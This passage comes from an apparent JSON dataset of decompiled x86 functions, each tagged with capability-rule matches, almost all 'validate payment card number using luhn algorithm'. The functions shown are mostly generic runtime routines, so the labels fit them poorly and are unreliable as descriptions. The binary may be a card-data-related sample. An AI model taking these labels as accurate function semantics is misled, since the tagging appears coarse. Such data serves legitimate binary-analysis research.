            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004042af(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.004021e4(arg_8h);\n    return;\n}\n",
        "token_count": 42
    },
    "004042d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004042d2(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    uint *puVar2;\n    \n    arg_ch = arg_ch - arg_8h;\n    arg_14h = arg_14h - arg_10h;\n    if (arg_18h == NULL) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 4);\n        CodePage = fcn.004055d3();\n    }\n    else {\n        iVar1 = arg_18h[1];\n        CodePage = *arg_18h;\n    }\n    if (iVar1 == 0) {\n        iVar1 = arg_ch;\n        if (arg_14h <= arg_ch) {\n            iVar1 = arg_14h;\n        }\n        iVar1 = fcn.004020e5(arg_8h, arg_10h, iVar1);\n        if ((iVar1 == 0) && (arg_ch != arg_14h)) {\n            iVar1 = (arg_14h <= arg_ch) * 2 + -1;\n        }\n    }\n    else {\n        iVar1 = fcn.00403f17(iVar1, 0x1000, arg_8h, arg_ch, arg_10h, arg_14h, CodePage);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            iVar1 = 0x7fffffff;\n        }\n        else {\n            iVar1 = iVar1 + -2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 394
    },
    "004042e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004042e1(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    uVar1 = 0;\n    uVar2 = uVar3;\n    if (uVar2 != 0xffff) {\n        if ((*(arg_ch + 0xc) == 0) && (uVar2 < 0x100)) {\n            uVar1 = uVar3 - 0x61;\n            if (uVar1 < 0x1a) {\n                uVar3 = uVar2 - 0x20;\n            }\n        }\n        else {\n            var_4h = uVar3;\n            uVar1 = fcn.0040466a(*(arg_ch + 0xc), 0x200, &arg_8h, 1, &var_4h, 1);\n            uVar3 = arg_8h & 0xffff;\n            if (uVar1 != 0) {\n                uVar3 = var_4h & 0xffff;\n            }\n        }\n    }\n    return uVar1 & 0xffff0000 | uVar3;\n}\n",
        "token_count": 296
    },
    "00404304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404304(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    uVar1 = in_ECX[4] - arg_8h;\n    if (arg_ch <= uVar1) {\n        uVar1 = arg_ch;\n    }\n    puVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        puVar2 = *in_ECX;\n    }\n    iVar3 = in_ECX[4] - uVar1;\n    in_ECX[4] = iVar3;\n    fcn.004059ac(puVar2 + arg_8h, uVar1 + puVar2 + arg_8h, (iVar3 - arg_8h) + 1);\n    return;\n}\n",
        "token_count": 200
    },
    "00404430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404430(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.004029b9();\n    fcn.00401d02(arg_ch, arg_ch_00);\n    return arg_8h;\n}\n",
        "token_count": 81
    },
    "00404471": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404471(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    fcn.004055b0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0);\n    return;\n}\n",
        "token_count": 88
    },
    "0040447b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040447b(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    fcn.00404179(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 89
    },
    "00404480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404480(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004054c0(arg_8h);\n    fcn.00406122(arg_8h_00);\n    return;\n}\n",
        "token_count": 72
    },
    "0040451b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040451b(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00404bd3(*arg_8h);\n    fcn.004029be(arg_8h[1]);\n    var_8h = 0;\n    var_4h = 0;\n    iVar1 = fcn.004030fd(&var_8h);\n    if (((iVar1 == 0) && (*arg_8h == var_8h)) && (arg_8h[1] == var_4h)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0040458e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040458e(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x10);\n}\n",
        "token_count": 40
    },
    "004045de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.004045de(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0;\n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x558748) == arg_ch) {\n            var_1ch = *(iVar1 * 8 + 0x55874c);\n            break;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x1d);\n    if (var_1ch == 0) {\n        fcn.0040524f(arg_28h, 0xffff);\n        fcn.00403d8c(arg_8h);\n        return CONCAT44(arg_24h, arg_20h);\n    }\n    var_18h = arg_10h;\n    var_14h = arg_14h;\n    var_10h = arg_18h;\n    var_ch = arg_1ch;\n    var_8h = arg_20h;\n    var_20h = arg_8h;\n    var_4h = arg_24h;\n    fcn.0040524f(arg_28h, 0xffff);\n    iVar1 = fcn.00402fe5(&var_20h);\n    if (iVar1 == 0) {\n        fcn.00403d8c(arg_8h);\n    }\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 428
    },
    "004045fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.004045fc(int32_t arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x426ee0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    fcn.00402e0f(arg_8h + 4, in_ECX + 1);\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 202
    },
    "00404624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404624(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004d3d36(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 64
    },
    "00404633": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404633(uint16_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint16_t *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    \n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n        if (arg_10h == arg_14h) goto code_r0x0046a90d;\n        uVar1 = *arg_8h;\n        uVar2 = *arg_10h;\n        if (uVar1 < uVar2) {\n            return 0xffffffff;\n        }\n        if (uVar1 >= uVar2 && uVar1 != uVar2) {\n            return 1;\n        }\n        arg_10h = arg_10h + 1;\n    }\n    if (arg_10h == arg_14h) {\ncode_r0x0046a90d:\n        uVar3 = arg_8h != arg_ch;\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 266
    },
    "0040467e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040467e(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (7 < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.004059ac(puVar1, arg_8h, arg_ch * 2);\n        *(arg_ch * 2 + puVar1) = 0;\n    }\n    else {\n        fcn.00405d76(arg_ch, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00404692": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404692(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 31
    },
    "004046ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046ce(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004b0c7c(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 65
    },
    "004046d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046d8(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00493c3a(4, \"InitializeCriticalSectionEx\", 0x555f3c, 0x555f44);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x578000)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00404700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404700(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x3c);\n}\n",
        "token_count": 40
    },
    "00404728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404728(uint arg_8h, char **arg_ch, uint arg_10h)\n\n{\n    uchar uVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404c82(**arg_ch, 0, &arg_10h);\n    *(in_ECX + 0xc) = uVar1;\n    uVar1 = fcn.00404c82(*arg_ch[1], 0, &arg_10h);\n    *(in_ECX + 0xd) = uVar1;\n    return;\n}\n",
        "token_count": 148
    },
    "00404746": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00404746(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040244b(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "0040474b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.0040474b(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 67
    },
    "004047b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047b4(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar var_5h;\n    uint var_4h;\n    \n    fcn.0040595c(arg_8h, arg_10h, arg_ch);\n    var_5h = 0;\n    fcn.00405e0c(arg_8h + arg_ch, &var_5h);\n    return;\n}\n",
        "token_count": 104
    },
    "004048ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004048ae(void)\n\n{\n    code *pcVar1;\n    \n    fcn.004060cd(0, 0, 0, 0, 0);\n    fcn.0040366b(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 84
    },
    "004048e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048e0(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = *(arg_8h + 0x10);\n    arg_8h_00 = fcn.00401e06();\n    fcn.004029f5(arg_8h_00, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "0040494e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040494e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "00404958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404958(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        if (arg_8h == *(uVar1 * 8 + 0x557750)) {\n            return *(uVar1 * 8 + 0x557754);\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x2d);\n    if (arg_8h - 0x13U < 0x12) {\n        return 0xd;\n    }\n    return (-(0xe < arg_8h - 0xbcU) & 0xe) + 8;\n}\n",
        "token_count": 163
    },
    "00404999": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404999(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004062df(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 119
    },
    "004049f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004049f8(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00404d6d(param_1);\n    return;\n}\n",
        "token_count": 58
    },
    "00404a52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a52(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401e29(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004037e2(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403d87(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403d87(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 424
    },
    "004ca06f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca06f(void)\n\n{\n    fcn.004ca267(0x16, \"LocaleNameToLCID\", 0x55982c, 0x559834);\n    return;\n}\n",
        "token_count": 48
    },
    "00404acf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404acf(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 31
    },
    "00404ad9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ad9(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401e29(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004037e2(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.004055c4(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.004055c4(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 440
    },
    "00404c2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c2d(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint var_10h;\n    uint var_8h;\n    \n    arg_10h = fcn.0040358a(&var_8h, 0);\n    fcn.00402eb4(&var_10h, 0x60, arg_10h);\n    fcn.0040330f(arg_8h, 0x27);\n    return arg_8h;\n}\n",
        "token_count": 113
    },
    "00404c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404c50(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    bool bVar2;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_8h = arg_8h * 2;\n        if (((*(in_ECX + 0x404) == 0) && (arg_8h < 0x401)) ||\n           (arg_8h < *(in_ECX + 0x400) || arg_8h == *(in_ECX + 0x400))) {\n            bVar2 = true;\n        }\n        else {\n            var_4h = fcn.0040409d(arg_8h);\n            bVar2 = var_4h != 0;\n            if (bVar2) {\n                fcn.00403f94(&var_4h);\n                *(in_ECX + 0x400) = arg_8h;\n            }\n            fcn.0040640b(var_4h);\n        }\n    }\n    else {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0xc;\n        bVar2 = false;\n    }\n    return bVar2;\n}\n",
        "token_count": 288
    },
    "00404c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404c78(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403c9c(arg_8h, arg_8h + 0x34, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 86
    },
    "00404ccd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.00404ccd(code **param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *param_1 = vtable.std::numpunct_char_.0;\n    fcn.00402efa(param_1);\n    fcn.00402a72();\n    return;\n}\n",
        "token_count": 89
    },
    "00404ce1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00404ce1(ushort *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    ushort *var_4h;\n    \n    var_4h = arg_8h;\n    for (; arg_10h != 0; arg_10h = arg_10h + -1) {\n        *var_4h = arg_ch;\n        var_4h = var_4h + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 112
    },
    "00404d31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d31(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.00401e29(iVar1 + arg_8h, arg_ch, 0x7ffffffe);\n        iVar4 = fcn.004037e2(iVar3 + 1);\n        in_ECX[5] = iVar3;\n        in_ECX[4] = iVar1 + arg_8h;\n        if (arg_ch < 8) {\n            fcn.00405830(iVar4);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.00405830(iVar4, iVar3, iVar1 * 2);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n            fcn.00401654(iVar3, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar4;\n        return;\n    }\n    fcn.0040393b();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 401
    },
    "00404d5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d5e(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    (*_sym.imp.KERNEL32.dll_FreeConsole)();\n    fcn.0040404d();\n    fcn.0040239c();\n    *in_ECX = arg_8h + *in_ECX;\n    in_ECX[1] = arg_ch + in_ECX[1];\n    return;\n}\n",
        "token_count": 104
    },
    "00404d6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00404d6d(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00403904(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00404d81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404d81(void)\n\n{\n    uint arg_8h;\n    int32_t *piVar1;\n    uint *puVar2;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00405623();\n    var_8h = fcn.0040502e(arg_8h);\n    var_10h = 8;\n    piVar1 = fcn.00405e34(&var_8h, &var_10h);\n    var_ch = *piVar1;\n    var_14h = var_ch + -1;\n    var_18h = fcn.00401dfc();\n    puVar2 = fcn.004029dc(&var_18h, &var_14h);\n    return *puVar2;\n}\n",
        "token_count": 210
    },
    "00404dea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00404dea(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ushort *puVar3;\n    \n    *arg_ch = 0x25;\n    pcVar2 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *pcVar2 = '+';\n        pcVar2 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *pcVar2 = '#';\n        pcVar2 = pcVar2 + 1;\n    }\n    puVar3 = pcVar2 + 1;\n    if (*arg_10h == 'L') {\n        *pcVar2 = 'I';\n        *puVar3 = 0x3436;\n        puVar3 = pcVar2 + 3;\n    }\n    else {\n        *pcVar2 = *arg_10h;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        uVar1 = 0x6f;\n    }\n    else if ((arg_14h & 0xe00) == 0x800) {\n        uVar1 = ~(arg_14h << 3) & 0x20U | 0x58;\n    }\n    else {\n        uVar1 = arg_10h[1];\n    }\n    *puVar3 = uVar1;\n    *(puVar3 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 363
    },
    "00404def": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404def(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x38);\n}\n",
        "token_count": 39
    },
    "00404dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
